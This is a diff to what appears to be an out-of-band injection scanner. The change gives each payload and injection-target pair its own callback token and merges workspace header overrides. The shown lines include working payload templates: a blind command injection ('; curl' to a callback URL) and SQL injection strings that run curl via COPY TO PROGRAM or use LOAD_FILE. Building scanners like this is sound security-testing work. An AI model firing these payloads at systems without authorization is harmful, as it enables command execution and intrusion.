@@ -21,7 +21,8 @@ from config import (
 )
 from injectors.base import (
     BaseInjector, _build_targets, _DROP_HEADERS, _SCAN_MARKER,
-    _inject_into_body, _normalize_url_params, _replace_path_segment,
+    _inject_into_body, _merge_headers_ci, _normalize_url_params,
+    _replace_path_segment,
 )
 from models.scan_config import ScanResult, VulnerabilityReport
 
@@ -57,21 +58,26 @@ class OOBInjector(BaseInjector):
 
     # ── Payload generation ────────────────────────────────────────────
 
-    def _generate_oob_payloads(self, scan_key: str) -> list[tuple[str, str, str]]:
-        """Generate (payload, token, sub_type) tuples with unique callback URLs.
+    def _mint_payload(self, scan_key: str, template_fn, sub_type: str) -> tuple[str, str, str]:
+        """Build one payload with a fresh unique callback token.
 
-        Each payload gets a unique token so callbacks can be correlated back
-        to the exact payload that triggered them.
+        A unique token is minted per (template, injection target) pair so a
+        callback can be attributed to the exact target that triggered it —
+        reusing one token across every target made the reported injection
+        point wrong whenever an endpoint had more than one target.
         """
-        payloads = []
+        token = uuid.uuid4().hex[:10]
+        url = f"{self._oob_base_url}/{scan_key}/{token}"
+        return template_fn(url), token, sub_type
+
+    def _oob_templates(self) -> list[tuple]:
+        """Return (template_fn, sub_type) pairs for the enabled OOB types."""
+        templates: list[tuple] = []
 
         def _add(template_fn, sub_type):
             if sub_type not in self._enabled_types:
                 return
-            token = uuid.uuid4().hex[:10]
-            url = f"{self._oob_base_url}/{scan_key}/{token}"
-            payload = template_fn(url)
-            payloads.append((payload, token, sub_type))
+            templates.append((template_fn, sub_type))
 
         # ── Blind Command Injection ──
         _add(lambda u: f"; curl {u} #", "cmd")
@@ -115,7 +121,7 @@ class OOBInjector(BaseInjector):
         _add(lambda u: f"'; COPY (SELECT '') TO PROGRAM 'curl {u}'; --", "sqli")
         _add(lambda u: f"' UNION SELECT LOAD_FILE('{u}')-- -", "sqli")
 
-        return payloads
+        return templates
 
     # ── Main scan loop ────────────────────────────────────────────────
 
@@ -138,15 +144,18 @@ class OOBInjector(BaseInjector):
         ctrl = control or {"signal": "run"}
         results: list[ScanResult] = []
 
-        # Merge workspace default headers under request headers
+        # Three-layer header merge: defaults → form/request headers → workspace overrides.
         try:
-            from api.routes import get_default_headers
+            from api.routes import get_default_headers, get_workspace_header_overrides
             defaults = await get_default_headers()
+            ws_overrides = await get_workspace_header_overrides()
         except Exception:
+            log.warning("Failed to load workspace header settings, using config defaults")
             defaults = dict(DEFAULT_HEADERS)
+            ws_overrides = {}
         merged_headers = dict(defaults)
         merged_headers.update(headers)
-        headers = merged_headers
+        headers = _merge_headers_ci(merged_headers, ws_overrides)
 
         url, params = _normalize_url_params(url, params)
 
@@ -171,16 +180,14 @@ class OOBInjector(BaseInjector):
                 await on_result(err, 1, 1)
             return [err]
 
-        # 2. Generate payloads with unique tokens
+        # 2. Prepare payload templates; a unique token is minted per injection
         scan_key = uuid.uuid4().hex[:12]
-        oob_payloads = self._generate_oob_payloads(scan_key)
+        templates = self._oob_templates()
         token_map: dict[str, tuple[str, str]] = {}  # token → (payload, sub_type)
-        for payload_str, token, sub_type in oob_payloads:
-            token_map[token] = (payload_str, sub_type)
 
         # 3. Build injection targets
         targets = _build_targets(injection_points, params, headers, body, target_keys, url)
-        total_injections = len(oob_payloads) * len(targets)
+        total_injections = len(templates) * len(targets)
         # total = injections + 1 (polling phase)
         total = total_injections + 1
 
@@ -191,7 +198,7 @@ class OOBInjector(BaseInjector):
         proxy_url = f"http://{PROXY_HOST}:{PROXY_PORT}"
         idx = 0
         async with httpx.AsyncClient(verify=False, timeout=timeout, proxy=proxy_url) as client:
-            for payload_str, token, sub_type in oob_payloads:
+            for template_fn, sub_type in templates:
                 for point, key in targets:
                     # Control signals
                     while ctrl.get("signal") == "pause":
@@ -200,6 +207,10 @@ class OOBInjector(BaseInjector):
                         self.results.extend(results)
                         return results
 
+                    # Mint a fresh token for this exact (template, target) pair
+                    # so the callback is attributed to the right target.
+                    payload_str, token, _ = self._mint_payload(scan_key, template_fn, sub_type)
+                    token_map[token] = (payload_str, sub_type)
                     token_target_map[token] = (point, key)
 
                     # Send the injection request (we don't analyze the response)
